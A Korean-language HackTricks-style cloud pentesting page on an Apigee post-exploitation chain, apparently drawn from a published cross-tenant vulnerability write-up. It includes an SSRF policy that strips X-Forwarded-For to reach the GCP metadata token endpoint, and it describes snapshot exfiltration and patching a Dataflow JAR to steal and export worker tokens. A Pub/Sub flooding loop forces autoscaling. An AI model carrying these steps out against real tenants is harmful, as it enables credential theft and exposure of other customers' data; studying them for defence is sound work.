# GCP - Apigee Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Apigee metadata SSRF -> Dataflow cross-tenant pivot

단일 Apigee 테넌트 프로젝트를 악용해 Message Processor metadata server에 접근하고, 해당 service account를 탈취하여 읽기/쓰기 권한이 있는 공유된 Dataflow 분석 파이프라인으로 피벗할 수 있습니다. 이 파이프라인은 cross-tenant buckets를 읽고 씁니다.

### Expose the metadata server through Apigee

- Apigee 프록시 대상(target)을 `http://169.254.169.254`로 설정하고 `/computeMetadata/v1/instance/service-accounts/default/token`에서 토큰을 요청합니다. 요청에 `Metadata-Flavor: Google`을 포함하세요.
- GCP metadata는 `X-Forwarded-For`가 포함된 요청을 거부합니다; Apigee는 기본적으로 이를 추가합니다. 프록시하기 전에 `AssignMessage`로 제거하세요:
```xml
<AssignMessage name="strip-xff">
<Remove>
<Headers>
<Header name="X-Forwarded-For"/>
</Headers>
</Remove>
<IgnoreUnresolvedVariables>true</IgnoreUnresolvedVariables>
</AssignMessage>
```
### 도난당한 Apigee 서비스 계정 열거

- leaked SA (Google-managed under `gcp-sa-apigee`)은 [gcpwn](https://github.com/NetSPI/gcpwn) 같은 도구로 열거하여 권한을 빠르게 테스트할 수 있습니다.
- 관찰된 강력한 권한에는 **Compute disk/snapshot admin**, **GCS read/write across tenant buckets**, 및 **Pub/Sub topic publish**가 포함되었습니다. 기본 탐색:
```bash
gcloud compute disks list --project <tenant-project>
```
### Snapshot exfiltration — 불투명한 관리형 서비스용

disk/snapshot 권한이 있으면 테넌트 프로젝트에 로그인할 수 없더라도 관리 런타임을 오프라인으로 검사할 수 있습니다:

1. 테넌트 프로젝트의 대상 디스크에서 snapshot을 생성합니다.
2. snapshot을 자신의 프로젝트로 복사/마이그레이션합니다.
3. snapshot으로부터 디스크를 재생성하고 VM에 연결합니다.
4. 로그/설정을 마운트하고 검사하여 내부 버킷 이름, 서비스 계정, 파이프라인 옵션 등을 복구합니다.

### Dataflow 의존성 교체 — 쓰기 가능한 staging bucket을 통해

- Analytics workers는 시작 시 GCS staging bucket에서 JARs를 가져왔습니다. Apigee SA에 bucket 쓰기 권한이 있었기 때문에 JAR을 다운로드하고 (예: Recaf로) 패치하여 `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` 를 호출하고 **Dataflow worker** 토큰을 탈취했습니다.
- Dataflow workers에는 인터넷 egress가 없었기 때문에, in-cluster GCP APIs를 사용해 토큰을 공격자 제어 GCS bucket에 기록하여 exfiltrate합니다.

### autoscaling을 악용해 악성 JAR 실행 강제

기존 워커는 교체된 아티팩트를 다시 로드하지 않습니다. 파이프라인 입력을 폭주시켜 새 워커를 생성하도록 트리거하세요:
```bash
for i in {1..5000}; do
gcloud pubsub topics publish apigee-analytics-notifications \
--message "flood-$i" --project <tenant-project>
done
```
새로 프로비저닝된 인스턴스는 patched JARs를 가져오며 Dataflow SA token을 leak합니다.

### 테넌트 간 버킷 설계 결함

디컴파일된 Dataflow 코드는 공유 metadata 버킷 아래에 테넌트별 구성 요소 없이 `revenue/edge/<api|mint>/tenant2TenantGroupCacheDir` 같은 캐시 경로를 보여주었습니다. Dataflow token으로 다음을 읽기/쓰기할 수 있습니다:

- `tenantToTenantGroup` 캐시 — 다른 테넌트의 프로젝트+환경 이름을 노출합니다.
- `customFields` 및 `datastores` 폴더 — 모든 테넌트에 걸친 요청별 analytics(최종 사용자 IP 및 평문 access tokens 포함)를 보관합니다.
- 쓰기 권한은 analytics의 잠재적 조작/오염을 의미합니다.

## 참고자료

- [GatewayToHeaven: Finding a Cross-Tenant Vulnerability in GCP's Apigee](https://omeramiad.com/posts/gatewaytoheaven-gcp-cross-tenant-vulnerability/)
- [AssignMessage policy - header removal](https://cloud.google.com/apigee/docs/api-platform/reference/policies/assign-message-policy)

{{#include ../../../banners/hacktricks-training.md}}
